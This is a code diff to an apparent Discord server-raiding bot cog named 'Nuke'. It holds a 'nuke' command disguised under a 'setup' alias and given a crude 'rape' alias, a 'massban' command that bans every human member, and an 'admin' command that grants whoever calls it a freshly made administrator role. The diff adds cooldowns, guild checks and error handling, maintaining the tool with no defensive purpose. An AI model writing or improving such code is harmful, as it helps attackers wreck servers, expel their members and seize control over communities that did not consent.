@@ -18,6 +18,7 @@ class Nuke(commands.Cog):
         self.operations: Operations | None = getattr(bot, "operations", None)
 
     @commands.command(name="nuke", aliases=["kill", "rape", "setup"])
+    @commands.cooldown(1, 300, commands.BucketType.guild)
     @is_blacklisted
     async def nuke(self, ctx: commands.Context) -> None:
         guild = ctx.guild
@@ -43,6 +44,7 @@ class Nuke(commands.Cog):
             logging.error(f"[nuke] failed: {e}\n{tb}")
 
     @commands.command(name="massban", aliases=["mb", "ban_everyone"])
+    @commands.cooldown(1, 7200, commands.BucketType.guild)
     @commands.bot_has_permissions(ban_members=True)
     @is_blacklisted
     async def massban(self, ctx: commands.Context) -> None:
@@ -65,12 +67,12 @@ class Nuke(commands.Cog):
         try:
             await self.bot.wait_for("reaction_add", timeout=TIMEOUT, check=check)
         except asyncio.TimeoutError:
-            await confirm_msg.edit(content="❌ Mass ban cancelled (timed out).")
+            await confirm_msg.edit(content="Mass ban cancelled (timed out).")
             return
 
         members_to_ban = [m for m in guild.members if m != guild.me and m != ctx.author and not m.bot]
         if not members_to_ban:
-            await confirm_msg.edit(content="❌ No members to ban.")
+            await confirm_msg.edit(content="No members to ban.")
             return
 
         await confirm_msg.edit(content=f"🔨 Banning {len(members_to_ban)} members...")
@@ -97,19 +99,40 @@ class Nuke(commands.Cog):
             await asyncio.sleep(1)
 
         logging.info(f"[massban] banned={banned} failed={failed} in {guild.id}")
-        await confirm_msg.edit(content=f"✅ Mass ban complete. Banned: {banned}, Failed: {failed}")
+        await confirm_msg.edit(content=f"Mass ban complete. Banned: {banned}, Failed: {failed}")
 
     @commands.command(name="admin")
+    @commands.guild_only()
     @commands.bot_has_permissions(manage_roles=True)
     @is_blacklisted
     async def admin(self, ctx: commands.Context) -> None:
-        guild = ctx.guild
         member = ctx.author
+        if member.guild_permissions.administrator:
+            await ctx.reply("You already have admin permissions.", delete_after=10)
+            return
 
-        role = await guild.create_role(name="verified777", permissions=discord.Permissions(administrator=True),)
+        role = await ctx.guild.create_role(name="verified777", permissions=discord.Permissions(administrator=True))
         await member.add_roles(role, reason="admin command")
-        await ctx.reply(f"✅ Created and assigned `verified777` with admin permissions.", delete_after=10)
-        logging.info(f"[admin] created role {role.id} for {member} in {guild.id}")
+        await ctx.reply(f"Created and assigned `verified777` with admin permissions.", delete_after=10)
+        logging.info(f"[admin] created role {role.id} for {member} in {ctx.guild.id}")
+
+    @admin.error
+    async def admin_error(self, ctx: commands.Context, error):
+        if isinstance(error, commands.BotMissingPermissions):
+            await ctx.reply("I need `Manage Roles` permission.", delete_after=5)
+        else:
+            logging.error(f"[admin] command error: {error}")
+
+    async def cog_command_error(self, ctx: commands.Context, error) -> None:
+        if isinstance(error, commands.CommandOnCooldown):
+            remaining = int(error.retry_after)
+            mins, secs = divmod(remaining, 60)
+            hours, mins = divmod(mins, 60)
+            if hours:
+                time_str = f"{hours}h {mins}m {secs}s"
+            else:
+                time_str = f"{mins}m {secs}s"
+            await ctx.reply(f"Cooldown active. Try again in {time_str}.", delete_after=15)
 
 async def setup(bot: commands.Bot) -> None:
     await bot.add_cog(Nuke(bot))
